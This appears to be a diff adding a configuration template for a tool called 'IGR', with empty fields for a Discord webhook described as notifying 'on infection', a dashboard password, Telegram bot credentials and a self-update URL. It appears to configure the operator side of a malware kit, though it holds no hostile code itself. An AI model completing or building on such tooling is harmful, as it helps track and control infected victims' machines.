@@ -1,0 +1,21 @@
+# IGR Configuration - Fill in your values then run build.bat
+# Lines starting with # are comments, empty lines are ignored
+# Format: KEY=VALUE (no quotes needed)
+
+# Discord webhook URL (for URL notification on infection)
+DISCORD_WEBHOOK=
+
+# Discord bot display name
+DISCORD_USERNAME=IGR
+
+# Dashboard login password
+DASHBOARD_PASSWORD=
+
+# Telegram bot token (from @BotFather)
+TELEGRAM_BOT_TOKEN=
+
+# Telegram chat ID (from @userinfobot)
+TELEGRAM_CHAT_ID=
+
+# Self-update URL (leave empty if not using)
+UPDATE_URL=
